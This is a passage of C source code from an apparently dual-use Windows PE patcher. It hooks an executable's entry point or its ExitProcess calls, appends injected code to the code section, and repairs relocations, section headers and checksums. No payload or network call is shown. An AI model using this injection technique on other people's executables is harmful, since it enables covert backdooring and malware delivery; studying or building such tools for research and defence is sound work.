			printf("Wrote %d bytes to %s successfully.\n", dwBytesWritten, outFilename);
#endif

	CloseHandle(hFile);
	return dwBytesWritten;
}

// assumes relocs are sorted in ascending order
BOOL hasRelocInRVARange(const BYTE *relocs, const DWORD relocsSize, const DWORD rva0, const DWORD len)
{
	DWORD bytesRead = 0;
	PIMAGE_BASE_RELOCATION block = (PIMAGE_BASE_RELOCATION)relocs;
	while (bytesRead < relocsSize && !IsBadReadPtr(block, sizeof(IMAGE_BASE_RELOCATION)) &&
		block->VirtualAddress)
	{
		if (block->VirtualAddress <= rva0 + len ||
			((PIMAGE_BASE_RELOCATION)((BYTE *)block + block->SizeOfBlock))->VirtualAddress >= rva0 - 3)
		{
			DWORD numEntries = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
			WORD *entry = (WORD *)((char *)block + sizeof(IMAGE_BASE_RELOCATION));
			for (DWORD i = 0; i < numEntries; i++)
			{
				WORD type = ((*entry & 0xf000) >> 12) & 0x0f;
				if (type == IMAGE_REL_BASED_HIGHLOW)
				{
					DWORD relocRVA = block->VirtualAddress + (*entry & 0x0fff);
					if (relocRVA >= rva0 - 3 && relocRVA <= rva0 + len)
						return TRUE;
				}
				entry++;
			}
		}

		bytesRead += block->SizeOfBlock;
		block = (PIMAGE_BASE_RELOCATION)((BYTE *)block + block->SizeOfBlock);
	}
	return FALSE;
}

BOOL removeReloc(LPVOID base, DWORD rva)
{
	PIMAGE_DOS_HEADER dos_header;
	PIMAGE_NT_HEADERS nt_header;
	PIMAGE_SECTION_HEADER section_headers;
	DWORD num_sections;
	int res = 0;
	if (init(base, 0, &dos_header, &nt_header, &section_headers, &num_sections) != 0)
		return FALSE;

	// no need to add relocs
	if ((nt_header->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED))
		return TRUE;

	PIMAGE_DATA_DIRECTORY relocDir = &(nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]);
	if (!relocDir->Size)
		return TRUE;

	DWORD bytesRead = 0;
	const BYTE *start = ADDR0(relocDir->VirtualAddress);
	PIMAGE_BASE_RELOCATION block = (PIMAGE_BASE_RELOCATION)start;
	while (bytesRead < relocDir->Size && !IsBadReadPtr(block, sizeof(IMAGE_BASE_RELOCATION)) &&
		block->VirtualAddress)
	{
		if (block->VirtualAddress <= rva &&
			((PIMAGE_BASE_RELOCATION)((BYTE *)block + block->SizeOfBlock))->VirtualAddress > rva)
		{
			BOOL found = FALSE;
			DWORD numEntries = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
			WORD *entry = (WORD *)((char *)block + sizeof(IMAGE_BASE_RELOCATION));
			for (DWORD i = 0; i < numEntries; i++)
			{
				WORD type = ((*entry & 0xf000) >> 12) & 0x0f;
				if (found)
					*(entry - 1) = *entry;
				else if (type == IMAGE_REL_BASED_HIGHLOW
					&& rva == block->VirtualAddress + (*entry & 0x0fff))
					found = TRUE;

				entry++;
			}

			if (!found)
				return FALSE;

			if (numEntries & 1)
			{
				BYTE *restOfDir = (BYTE *)block + block->SizeOfBlock;
				block->SizeOfBlock -= 4;
				memmove(restOfDir - 4, restOfDir, relocDir->Size - (restOfDir - start));
				relocDir->Size -= 4;
				restOfDir -= 4;

				memset((void *)(start + relocDir->Size), 0xCD, 4);
				DWORD relocSectIdx = SECT_IDX0(relocDir->VirtualAddress);
				if (relocDir->Size + 4 == section_headers[relocSectIdx].Misc.VirtualSize)
					section_headers[relocSectIdx].Misc.VirtualSize -= 4;
			}
			else
				*(entry - 1) = 0;

			return TRUE;
		}

		bytesRead += block->SizeOfBlock;
		block = (PIMAGE_BASE_RELOCATION)((BYTE *)block + block->SizeOfBlock);
	}

	return FALSE;
}

void hookCallsToVA(LPVOID base, PATCH *patch, DWORD va, PIMAGE_SECTION_HEADER codeHdr, BYTE *code, char *funcName)
{
	DWORD codeLen = min(codeHdr->SizeOfRawData, codeHdr->Misc.VirtualSize);
	for (DWORD i = 0; i < codeLen - 6; i++)
	{
		// call/jmp dword ptr[VA of ExitProcess in IAT]
		if (code[i] == 0xFF && (code[i + 1] == 0x15 || code[i + 1] == 0x25)
			&& *((DWORD *)(code + i + 2)) == va)
		{
			DWORD rvaOfReloc = codeHdr->VirtualAddress + i + 2;
			if (!removeReloc(base, rvaOfReloc))
			{
				printf("[-] Failed to remove relocation for %s to %s() @ RVA:0x%08X, file offset:0x%08X\n",
					code[i + 1] == 0x15 ? "call" : "jmp", funcName, codeHdr->VirtualAddress + i, codeHdr->PointerToRawData + i);
				return;
			}

			printf("[+] Entry point at %s to %s() @ RVA:0x%08X, file offset:0x%08X\n",
				code[i + 1] == 0x15 ? "call" : "jmp", funcName, codeHdr->VirtualAddress + i, codeHdr->PointerToRawData + i);
			if (!patch->jmpback)
			{
				patch->jmpbackSize = 6;
				patch->jmpback = (BYTE *)malloc(patch->jmpbackSize);
				memcpy(patch->jmpback, code + i, patch->jmpbackSize);
				patch->relocs.count++;
				patch->relocs.offsets = (DWORD *)realloc(patch->relocs.offsets, patch->relocs.count*sizeof(DWORD));
				patch->relocs.offsets[patch->relocs.count - 1] = patch->codeSize + 2;
			}

			code[i] = 0x90;
			code[i + 1] = 0xE9;
			*((long *)(code + i + 2)) = patch->targetPoint - (code + i + 6);
			patch->entryPoint = code + i; // let it keep the last one found

			i += 6;
		}
	}
}

/* -Will back up least 5 bytes of instructions at patch->entryPoint so that
 *  a "jmp rel32" can be written at patch->entryPoint
 * -"jmp rel32" (see patch->jmpto) will be jumping to patch->targetPoint
 * - (a) Appends the backed up instructions at the end of patch->code
 * - (b) Appends a jmp back to the instruction following the ones moved (at patch->entryPoint + <size of moved instr.>)
 * - patch->jmpback = (a) + (b)
 * -Repairs relative references of the moved instructions and any others 
 *  refering to them.
 */
void hookPEEntryPoint(PATCH* patch, REL_REFERENCES *relRefs)
{
	BYTE replacedcode[5+15];					// worst case scenario (max instr. length is 16)
	DWORD replacedcodeSize = 0;

	DISASSEMBLY disas;							// Creates a Disasm Struct
	disas.Address = (DWORD)patch->entryPoint;	//
	DWORD instr_len = 0;
	REL_REF_DEST *rrd = NULL;
	for(BYTE *c = patch->entryPoint; c < patch->entryPoint+5; c+=instr_len, instr_len=0)
    {
		// Decode instruction
		FlushDecoded(&disas);
        Decode(&disas, (char *)c, &instr_len);
		instr_len++;

		for (DWORD i = 0; i < instr_len; i++)
			replacedcode[replacedcodeSize + i] = c[i];

		// repair their rel. offsets, because they will be moved
		if (containsRelOffset(c, &disas))
			addToRelOffset(&disas, 
				replacedcode + replacedcodeSize, 
				(int)(patch->entryPoint - (patch->targetPoint+patch->codeSize)));
		replacedcodeSize += instr_len;

		// repair relative offset references to them
		if ((rrd = getRelRefDest(c, relRefs)) != NULL) 
			addRRDToOPL(rrd, patch, (int)(patch->targetPoint + patch->codeSize - patch->entryPoint));

		// TODO: repair RVA references to them (CONTINUE ADDING TO OFF_PATCH_LIST)
	}
	
	for (DWORD i = 0; i < replacedcodeSize; i++)
		patch->entryPoint[i] = 0x90;

	patch->jmpbackSize = replacedcodeSize + 5; // jmpback = replacedCode + actual jmpback
	patch->jmpback = (BYTE *) malloc(patch->jmpbackSize);
	for (DWORD i = 0; i < replacedcodeSize; i++)
		patch->jmpback[i] = replacedcode[i];

	// create a jump back instruction as the last one
	patch->jmpback[replacedcodeSize] = 0xE9; // jmp rel32
	*((int *)(patch->jmpback + replacedcodeSize + 1)) = (int)(patch->entryPoint + replacedcodeSize) -
														(int)(patch->targetPoint + patch->codeSize + patch->jmpbackSize)
														;
	// create the instruction that will jump to the inserted code
	*(patch->jmpto) = 0xE9; // jmp rel32
	*((int *)(patch->jmpto + 1)) = (int)patch->targetPoint - (int)patch->entryPoint - 5;
}

void assemeblePatch(PATCH *patch, BYTE *buffer)
{
	DWORD totalPatchCodeSize = TOTAL_PATCH_SZ(patch);
	memcpy(buffer, patch->code, patch->codeSize);
	memcpy(buffer + patch->codeSize, patch->jmpback, patch->jmpbackSize);
	memset(buffer + patch->codeSize + patch->jmpbackSize, 0xCC,
		totalPatchCodeSize - patch->codeSize - patch->jmpbackSize);
}

void addRRDToOPL(const REL_REF_DEST *rrd, PATCH *patch, int delta)
{
	OFF_PATCH_LIST *offPatchList;
	DISASSEMBLY rrs_disas;
	DWORD rrs_idx = 0;
	BYTE offsetToOperands;
	for (DWORD i = 0; i < rrd->numSources; i++)
	{
		rrs_idx = 0;
		FlushDecoded(&rrs_disas);
		Decode(&rrs_disas, (char *)rrd->sources[i]->addr, &rrs_idx);

		// connect new offPatchList
		offPatchList = (OFF_PATCH_LIST *) malloc(sizeof(OFF_PATCH_LIST));
		offPatchList->next = patch->offPatchList;
		patch->offPatchList = offPatchList;

		offsetToOperands = OFFSET_TO_OPERANDS(rrs_disas, rrd->sources[i]->addr);
		offPatchList->point = rrd->sources[i]->addr + offsetToOperands;
		offPatchList->delta = delta;
		offPatchList->numBytes = (BYTE)(rrs_disas.OpcodeSize + rrs_disas.PrefixSize) - offsetToOperands;
	}
}

void buildRelRefOPL(REL_REFERENCES *refs, PATCH *patch)
{
	int sign;
	for (DWORD i = 0; i < refs->numDests; i++) 
	{
		// sign < 0  : dest is above, source might be below
		// sign >= 0 : dest is below, source might be above
		sign = (refs->dests[i].addr - patch->targetPoint >= 0) ? 1 : -1;
		for (DWORD j = 0; j < refs->dests[i].numSources; j++) 
			if ((refs->dests[i].sources[j]->addr - patch->targetPoint) * sign < 0)
				addRRDToOPL(&(refs->dests[i]), patch, sign*patch->codeSize);
	}
}

/*
* returns FALSE on overflow
*/
bool applyOPL(PATCH* patch)
{
	OFF_PATCH_LIST *opl = patch->offPatchList;
	while (opl)
    {
		if (opl->numBytes == sizeof(char))
		{
			if (*((char *)(opl->point)) + opl->delta > (int)0x7F || // overflow checking
				*((char *)(opl->point)) + opl->delta < (int)0xFFFFFF80 )
				return FALSE;
			*((char *)(opl->point)) += opl->delta;
		}
		else if (opl->numBytes == sizeof(short))
		{
			if (*((short *)(opl->point)) + opl->delta > (int)0x7FFF ||
				*((short *)(opl->point)) + opl->delta < (int)0xFFFF8000 )
				return FALSE;
			*((short *)(opl->point)) += opl->delta;
		}
		else 
			*((int *)(opl->point)) += opl->delta;
		opl = opl->next;
	}
	return TRUE;
}

PIMAGE_SECTION_HEADER getCodeSectionHeader(LPCVOID base)
{
	PE_HEADERS_PTRS headers;
	PIMAGE_DOS_HEADER dos_header;
	PIMAGE_NT_HEADERS nt_header;
	PIMAGE_SECTION_HEADER section_headers;
	DWORD num_sections;

	if (init(base, &headers, &dos_header, &nt_header, &section_headers, &num_sections) != 0)
		return NULL;

	DWORD imageBase = nt_header->OptionalHeader.ImageBase;

	// get a pointer to the code section
	int codeSecIdx = SECT_IDX0(nt_header->OptionalHeader.AddressOfEntryPoint);
	return &(section_headers[codeSecIdx]);
}

/* 
 * caller responsible to free returned copy
 */
BYTE *getCopyOfSection(LPCVOID base, DWORD sectIdx)
{
	PIMAGE_SECTION_HEADER section_headers;
	if (init(base, 0, 0, 0, &section_headers) != 0)
		return 0;

	PIMAGE_SECTION_HEADER sect = section_headers + sectIdx;
	BYTE *section = (BYTE *)malloc(sect->SizeOfRawData);
	memcpy(section, (BYTE *)base + sect->PointerToRawData, sect->SizeOfRawData);
	return section;
}

int extendPETextSection(LPVOID *base, DWORD *size, DWORD additionalSize, BYTE filler)
{
	PIMAGE_NT_HEADERS nt_header;
	PIMAGE_SECTION_HEADER section_headers;
	DWORD num_sections;

	if (init(*base, 0, 0, &nt_header, &section_headers, &num_sections) != 0)
		return NULL;

	if (additionalSize == 0)
		additionalSize = nt_header->OptionalHeader.FileAlignment;

	// get a pointer to the code section
	int codeSecIdx = SECT_IDX0(nt_header->OptionalHeader.AddressOfEntryPoint);
	return appendToPESection(base, size, codeSecIdx, NULL, additionalSize, filler);
}

int extendPESection(LPVOID *base, DWORD *size, const DWORD sectIdx, DWORD additionalSize, BYTE filler)
{
	return appendToPESection(base, size, sectIdx, NULL, additionalSize, filler);
}

/*
 * caller responsible to free <base> and <data> in any case (success/failure)
 */
int appendToPESection(LPVOID *base, DWORD *size, const DWORD sectIdx, LPCVOID data, const DWORD data_size, BYTE filler)
{
	PE_HEADERS_PTRS headers_old;
	if (!getPEHeaders(*base, &headers_old))
	{
		puts("[-] Error parsing the PE headers");
		return 1;
	}

	PIMAGE_SECTION_HEADER section_headers_old = headers_old.section_headers;
	DWORD section_size_old = section_headers_old[sectIdx].SizeOfRawData;
	DWORD offset_to_section = section_headers_old[sectIdx].PointerToRawData;

	BYTE *section = (BYTE *)malloc(section_size_old + data_size);
	memcpy(section, (BYTE *)*base + offset_to_section, section_size_old);
	if (data)
		memcpy(section + section_size_old, data, data_size);
	else // just extend it with <filler> bytes
		memset(section + section_size_old, filler, data_size);

	int res = replacePESection(base, size, sectIdx, section, section_size_old + data_size, filler);
	free(section);
	return res;
}

/*
 * caller responsible to free base and section in any case (success/failure)
 */
int replacePESection(LPVOID *base, DWORD *size, const DWORD sectIdx, LPCVOID section, const DWORD section_size, BYTE filler)
{
	LPVOID base_old = *base;
	DWORD size_old = *size;
	DWORD tmpSectIdx = 0;
	PE_HEADERS_PTRS headers_old, headers;
	
	/* init original/old headers */
	if (!getPEHeaders(*base, &headers_old))
	{
		puts("[-] Error parsing the PE headers");
		return 1;
	}
	PIMAGE_NT_HEADERS nt_header_old = headers_old.nt_header;
	PIMAGE_SECTION_HEADER section_headers_old = headers_old.section_headers;
	DWORD num_sections = headers_old.number_of_sections;
	DWORD section_size_old = section_headers_old[sectIdx].SizeOfRawData;
	DWORD actual_section_size = ALIGN(section_size, FILE_ALIGN);
	DWORD padding_len = actual_section_size - section_size;

	*size += actual_section_size - section_size_old;
	*base = malloc(*size);


	DWORD offset_to_section = section_headers_old[sectIdx].PointerToRawData;
	memcpy((BYTE *)*base, base_old, offset_to_section);
	memcpy((BYTE *)*base + offset_to_section, section, section_size);
	memset((BYTE *)*base + offset_to_section + section_size, filler, padding_len);
	memcpy((BYTE *)*base + offset_to_section + actual_section_size, 
		(BYTE *)base_old + offset_to_section + section_size_old, 
		size_old - offset_to_section - section_size_old);
	

	/* init new headers */
	getPEHeaders(*base, &headers);
	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)*base;
	PIMAGE_NT_HEADERS nt_header = headers.nt_header;
	PIMAGE_SECTION_HEADER section_headers = headers.section_headers;

	section_headers[sectIdx].SizeOfRawData = actual_section_size;
	section_headers[sectIdx].Misc.VirtualSize = section_size;
	
	/* repair all the section headers following the replaced one */
	for (DWORD i = sectIdx + 1; i < num_sections; i++)
	{
		/* previous section's virtual size is aligned to section Alignment */
		section_headers[i].VirtualAddress = section_headers[i - 1].VirtualAddress +
										ALIGN(section_headers[i - 1].Misc.VirtualSize, SECT_ALIGN);
		/* calculate the new Pointer to Raw Data */
		section_headers[i].PointerToRawData = section_headers[i - 1].PointerToRawData + 
		/* not sure if there's a chance that the file
		   is not aligned; that would suck->*/	ALIGN(section_headers[i - 1].SizeOfRawData, FILE_ALIGN);
	}
	puts("[+] Section headers repaired");

	if (!repairAllDataDirs(headers, section_headers_old))
	{
		free(*base);
		*base = base_old;
		return 2;
	}

	/* repair references in headers */
	DWORD codeSecIdx = SECT_IDX(nt_header->OptionalHeader.AddressOfEntryPoint);
	if (codeSecIdx == sectIdx)
		nt_header->OptionalHeader.SizeOfCode = section_headers[codeSecIdx].SizeOfRawData;

	nt_header->OptionalHeader.AddressOfEntryPoint += RVA_DELTA(codeSecIdx);
	tmpSectIdx = SECT_IDX(nt_header->OptionalHeader.BaseOfCode);
	nt_header->OptionalHeader.BaseOfCode += RVA_DELTA(tmpSectIdx);
	tmpSectIdx = SECT_IDX(nt_header->OptionalHeader.BaseOfData);
	nt_header->OptionalHeader.BaseOfData += RVA_DELTA(tmpSectIdx);
	nt_header->OptionalHeader.SizeOfImage = section_headers[num_sections - 1].VirtualAddress +
										ALIGN(section_headers[num_sections - 1].Misc.VirtualSize, SECT_ALIGN);


	DWORD dwPriorCheckSum, dwNewCheckSum;
	if (CheckSumMappedFile(*base, *size, &dwPriorCheckSum, &dwNewCheckSum) == NULL)
	{
		puts("[-] CheckSumMappedFile failed");
		free(*base);
		*base = base_old;
		return 3;
	}
	nt_header->OptionalHeader.CheckSum = dwNewCheckSum;

	free(base_old);
	return 0;
}

int addRelocsSection(LPVOID *base, DWORD *size)
{
	LPVOID base_old = *base;
	DWORD size_old = *size;

	// malloc and copy, considering file alignment
	PE_HEADERS_PTRS headers, headers_old;
	getPEHeaders(*base, &headers_old);
	PIMAGE_NT_HEADERS nt_header_old = headers_old.nt_header;
	PIMAGE_SECTION_HEADER section_headers_old = headers_old.section_headers;
	int num_sections = headers_old.number_of_sections;
	PIMAGE_SECTION_HEADER last = section_headers_old + (num_sections-1);

	DWORD offestToSectHeaders = (BYTE *)headers_old.section_headers - (BYTE *)base_old;
	DWORD paddedPrevHeadersLen = ALIGN(offestToSectHeaders + num_sections*sizeof(IMAGE_SECTION_HEADER), FILE_ALIGN) - offestToSectHeaders;
	DWORD paddedHeadersLen = ALIGN(offestToSectHeaders + (num_sections+1)*sizeof(IMAGE_SECTION_HEADER), FILE_ALIGN) - offestToSectHeaders;
	DWORD headersDelta = paddedHeadersLen - paddedPrevHeadersLen;
	DWORD paddedSectSize = ALIGN(sizeof(IMAGE_BASE_RELOCATION)+2, FILE_ALIGN);


	*size += headersDelta + paddedSectSize;
	*base = malloc(*size); // could be done with realloc but it might be more inefficient

	
	DWORD offsetToPrevRawData = offestToSectHeaders + paddedPrevHeadersLen;
	DWORD minRawDataPointer = 0xFFFFFFFF;
	for (int i = 0; i < num_sections; i++)
		if (section_headers_old[i].SizeOfRawData && section_headers_old[i].PointerToRawData < minRawDataPointer)
			minRawDataPointer = section_headers_old[i].PointerToRawData;
	if (minRawDataPointer != offsetToPrevRawData)
	{
		free(*base);
		*base = base_old;
		*size = size_old;
		printf("[-] Error: raw data offset mismatch: PointerToRawData points to %#lx, \
			  and FileAlignment suggests %#lx\n", minRawDataPointer, offsetToPrevRawData);
		return 5;
	}

	DWORD offsetToPrevLastSectionEnd = last->PointerToRawData + last->SizeOfRawData; // rely on this being aligned
	memcpy((BYTE *)*base, base_old, offsetToPrevRawData);
	memcpy((BYTE *)*base + offsetToPrevRawData + headersDelta,
		(BYTE *)base_old + offsetToPrevRawData, offsetToPrevLastSectionEnd - offsetToPrevRawData); 
	memcpy((BYTE *)*base + offsetToPrevLastSectionEnd + headersDelta + paddedSectSize,
		(BYTE *)base_old + offsetToPrevLastSectionEnd,
		size_old - offsetToPrevLastSectionEnd);

	// setup fields
	getPEHeaders(*base, &headers);
	PIMAGE_NT_HEADERS nt_header = headers.nt_header;
	PIMAGE_SECTION_HEADER section_headers = headers.section_headers;
	last = section_headers + (num_sections - 1);

	DWORD maxVA = 0x0;
	for (int i = 0; i < num_sections; i++)
	{
		section_headers[i].PointerToRawData += headersDelta;
		if (section_headers[i].VirtualAddress + section_headers[i].Misc.VirtualSize > maxVA)
			maxVA = section_headers[i].VirtualAddress + section_headers[i].Misc.VirtualSize;
	}
	nt_header->FileHeader.NumberOfSections++;
	if (nt_header->OptionalHeader.NumberOfRvaAndSizes < IMAGE_DIRECTORY_ENTRY_BASERELOC+1)
	{
		printf("[-] File NT header states %d number data directories (?)\n");
		free(*base);
		*base = base_old;
		return 6;
	}
		
	headers.number_of_sections++;
	num_sections++;

	PIMAGE_DATA_DIRECTORY relocDir = &(nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]);
	PIMAGE_SECTION_HEADER reloc = section_headers + num_sections - 1;
	PIMAGE_BASE_RELOCATION block = (PIMAGE_BASE_RELOCATION)((BYTE *)*base + offsetToPrevLastSectionEnd + headersDelta);

	memset(reloc->Name, 0, sizeof(IMAGE_SECTION_HEADER));
	memcpy(reloc->Name, ".reloc", 6);
	reloc->SizeOfRawData = paddedSectSize;
	reloc->Misc.VirtualSize = sizeof(IMAGE_BASE_RELOCATION)+2;
	reloc->VirtualAddress = ALIGN(maxVA, SECT_ALIGN);
	reloc->PointerToRawData = offsetToPrevLastSectionEnd + headersDelta;
	reloc->Characteristics = IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_DISCARDABLE | IMAGE_SCN_MEM_READ;

	memset(block, 0, paddedSectSize);
	block->SizeOfBlock = sizeof(IMAGE_BASE_RELOCATION)+2;
	block->VirtualAddress = last->VirtualAddress;

	// repair data dirs following the injection
	// -> the following are nasty hacks to get repairAllDataDirs to work as we want
	((PIMAGE_SECTION_HEADER)(section_headers_old + num_sections - 1))
		->VirtualAddress = reloc->VirtualAddress;						// to have an upper bound in getSectionIndex
	((PIMAGE_SECTION_HEADER)(section_headers_old + num_sections - 1))
		->PointerToRawData = reloc->PointerToRawData - paddedSectSize;	// to trick any certificates that got moved ahead
	if (!repairAllDataDirs(headers, section_headers_old))
	{
		free(*base);
		*base = base_old;
		return 2;
	}

	relocDir->Size = sizeof(IMAGE_BASE_RELOCATION)+2;
	relocDir->VirtualAddress = reloc->VirtualAddress;

	nt_header->OptionalHeader.SizeOfImage = ALIGN(reloc->VirtualAddress + reloc->Misc.VirtualSize, SECT_ALIGN);
	nt_header->OptionalHeader.SizeOfHeaders += headersDelta;

	// checksum
	DWORD dwPriorCheckSum, dwNewCheckSum;
	if (CheckSumMappedFile(*base, *size, &dwPriorCheckSum, &dwNewCheckSum) == NULL)
	{
		puts("[-] CheckSumMappedFile failed");
		free(*base);
		*base = base_old;
		return 3;
	}
	nt_header->OptionalHeader.CheckSum = dwNewCheckSum;

	free(base_old);
	return 0;
}

DWORD countRelocBlocks(PIMAGE_DATA_DIRECTORY relocDir, PIMAGE_BASE_RELOCATION block)
{
	DWORD readBytes = 0, numBlocks = 0;
	while (readBytes < relocDir->Size && !IsBadReadPtr(block, sizeof(IMAGE_BASE_RELOCATION)) &&
		block->VirtualAddress)
	{
		numBlocks++;
		readBytes += block->SizeOfBlock;
		block = (PIMAGE_BASE_RELOCATION)((BYTE *)block + block->SizeOfBlock);
	}
	return numBlocks;
}

DWORD addRelocsIn(PIMAGE_BASE_RELOCATION block, const PATCH *patch, BOOL *added)
{
	DWORD relRVA;
	WORD *entry = (WORD *)((BYTE *)block + sizeof(IMAGE_BASE_RELOCATION));
	DWORD numEntries = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
	DWORD totalAdded = 0;

	// trim the padding, and add it later if needed
	if (numEntries && (entry[numEntries - 1] == 0))
		numEntries--;

	// add the ones that fit in here
	for (DWORD offsetI = 0; offsetI < patch->relocs.count; offsetI++)
	{
		if (added[offsetI])
			continue;

		relRVA = patch->codeRVA + patch->relocs.offsets[offsetI];
		int delta = relRVA - block->VirtualAddress;
		if (delta >= 0 && delta <= 0x0FFF)
		{
			added[offsetI] = TRUE;
			entry[numEntries] = delta | ((IMAGE_REL_BASED_HIGHLOW << 12) & 0xF000);
			numEntries++;
			totalAdded++;
		}
	}

	// align to 4-byte boundary
	if (numEntries & 1)
	{
		entry[numEntries] = 0;
		numEntries++;
	}

	block->SizeOfBlock = sizeof(IMAGE_BASE_RELOCATION) + numEntries*sizeof(WORD);
	return totalAdded;
}

void sortRelocBlock(PIMAGE_BASE_RELOCATION block)
{
	DWORD count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
	WORD last = *((WORD *)((BYTE *)block + sizeof(IMAGE_BASE_RELOCATION)) + count - 1);
	if (count && (last == (0 | ((IMAGE_REL_BASED_ABSOLUTE << 12) & 0xF000))))
		count--;
	if (count)
		heapsort((WORD *)((BYTE *)block + sizeof(IMAGE_BASE_RELOCATION)), count);
}

int patchRelocs(LPVOID *base, DWORD *size, PATCH *patch)
{
	if (patch->relocs.count < 1)
		return 0;

	PIMAGE_DOS_HEADER dos_header;
	PIMAGE_NT_HEADERS nt_header;
	PIMAGE_SECTION_HEADER section_headers;
	DWORD num_sections;
	int res = 0;
	if ((res = init(*base, 0, &dos_header, &nt_header, &section_headers, &num_sections)) != 0)
		return res;


	// no need to add relocs
	if ((nt_header->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED))
		return 0;


	PIMAGE_DATA_DIRECTORY orig_relocDir = &(nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]);	
	if (!orig_relocDir->Size)
	{
		int relRes;
		if ((relRes = addRelocsSection(base, size)) != 0)
		{
			puts("[-] Failed to add .reloc section");
			return relRes;
		}

		init(*base, 0, &dos_header, &nt_header, &section_headers, &num_sections);
		orig_relocDir = &(nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]);
	}

	PIMAGE_BASE_RELOCATION orig_first_block = (PIMAGE_BASE_RELOCATION)ADDR0(orig_relocDir->VirtualAddress);
	DWORD numBlocks = countRelocBlocks(orig_relocDir, orig_first_block);

	// alloc. some mem to work on
	BYTE *relocDir = (BYTE *)calloc(
		orig_relocDir->Size
		+ sizeof(IMAGE_BASE_RELOCATION)*patch->relocs.count*sizeof(WORD) // worst case (1 block / new entry)
		+ numBlocks*sizeof(WORD), // worst-case padding scenario (all of them need padding)
		sizeof(BYTE));

	DWORD totalAdded = 0;
	BOOL *added = (BOOL *)calloc(patch->relocs.count, sizeof(BOOL));
	DWORD sizeUsed = 0;
	PIMAGE_BASE_RELOCATION orig_block = orig_first_block;
	PIMAGE_BASE_RELOCATION block = (PIMAGE_BASE_RELOCATION)relocDir;

	// first add to the existing blocks, if feasible (i.e. without overflowing)
	for (DWORD blockI = 0; blockI < numBlocks; blockI++)
	{
		memcpy(block, orig_block, orig_block->SizeOfBlock);

		totalAdded += addRelocsIn(block, patch, added); // will also align to 4-byte boundary
		sizeUsed += block->SizeOfBlock;

		sortRelocBlock(block);

		orig_block = (PIMAGE_BASE_RELOCATION)((BYTE *)orig_block + orig_block->SizeOfBlock);
		block = (PIMAGE_BASE_RELOCATION)((BYTE *)block + block->SizeOfBlock);
	}

	// then add new blocks for the remaining ones
	while (totalAdded < patch->relocs.count)
	{
		for (DWORD offsetI = 0; offsetI < patch->relocs.count; offsetI++)
		{
			if (!added[offsetI])
			{
				block->VirtualAddress = ALIGN(patch->relocs.offsets[offsetI] + patch->codeRVA + 1, 0x1000) - 0x1000;
				block->SizeOfBlock = sizeof(IMAGE_BASE_RELOCATION);
				break;
			}
		}
		assert(block->VirtualAddress);

		totalAdded += addRelocsIn(block, patch, added);
		sizeUsed += block->SizeOfBlock;

		sortRelocBlock(block);

		// maintain order
		PIMAGE_BASE_RELOCATION bHigher = (PIMAGE_BASE_RELOCATION)relocDir;
		for (DWORD blockI = 0; blockI < numBlocks; blockI++)
		{
			if (bHigher->VirtualAddress > block->VirtualAddress)
				break;
			bHigher = (PIMAGE_BASE_RELOCATION)((BYTE *)bHigher + bHigher->SizeOfBlock);
		}
		if (bHigher != block)
		{
			PIMAGE_BASE_RELOCATION newBlockBackup = (PIMAGE_BASE_RELOCATION)((BYTE *)block + block->SizeOfBlock);

			DWORD newBlockSize = block->SizeOfBlock;
			BYTE *tmp = (BYTE *)malloc(newBlockSize);
			memcpy(tmp, block, newBlockSize);
			DWORD size = sizeUsed - newBlockSize - ((BYTE *)bHigher - (BYTE *)relocDir);
			LPVOID retp = memmove((BYTE *)bHigher + newBlockSize, bHigher, size);
			memcpy(bHigher, tmp, newBlockSize);
			free(tmp);

			block = newBlockBackup;
		} else 
			block = (PIMAGE_BASE_RELOCATION)((BYTE *)block + block->SizeOfBlock);

		numBlocks++;
	}

	relocDir = (BYTE *)realloc(relocDir, sizeUsed);
	free(added);

	DWORD relocSectIdx = SECT_IDX0(orig_relocDir->VirtualAddress);
	BYTE *relocSect = getCopyOfSection(*base, relocSectIdx);
	DWORD sectionSize = section_headers[relocSectIdx].SizeOfRawData;
	DWORD offsetInSection = orig_relocDir->VirtualAddress - section_headers[relocSectIdx].VirtualAddress;
	if (offsetInSection + sizeUsed > sectionSize)
	{
		sectionSize = ALIGN(offsetInSection + sizeUsed, nt_header->OptionalHeader.FileAlignment);
		relocSect = (BYTE *)realloc(relocSect, sectionSize);
	}
	memcpy(relocSect + offsetInSection, relocDir, sizeUsed);
	res = replacePESection(base, size, relocSectIdx, relocSect, sectionSize);

	init(*base, 0, 0, &nt_header);
	orig_relocDir = &(nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]);
	orig_relocDir->Size = sizeUsed;

	free(relocDir);
	free(relocSect);

	return res;
}

DWORD getPatchVA(LPCVOID base, const DWORD patchCodeSize)
{
	PE_HEADERS_PTRS headers;
	PIMAGE_NT_HEADERS nt_header;
	PIMAGE_SECTION_HEADER section_headers;
	DWORD num_sections;

	if (init(base, &headers, 0, &nt_header, &section_headers, &num_sections) != 0)
		return 0;
	
	const DWORD imageBase = nt_header->OptionalHeader.ImageBase;
	const int codeSecIdx = SECT_IDX0(nt_header->OptionalHeader.AddressOfEntryPoint);
	PIMAGE_SECTION_HEADER codeHdr = &(section_headers[codeSecIdx]);
	DWORD patchRVA;
	PATCH tmpPatch;
	tmpPatch.codeSize = patchCodeSize;
	if (PATCH_FITS_IN_PADDING(&tmpPatch, codeHdr))
		patchRVA = codeHdr->VirtualAddress + codeHdr->Misc.VirtualSize;
	else
		patchRVA = codeHdr->VirtualAddress + codeHdr->SizeOfRawData;
	
	return imageBase + patchRVA;
}

void replaceAllGetPC(INSTRUCTION **iHeadPtr, DWORD *numInstr, LPCVOID base)
{
	INSTRUCTION *call = NULL;
	BOOL atLeastOne = FALSE;
	do {
		if (call)
		{
			atLeastOne = TRUE;
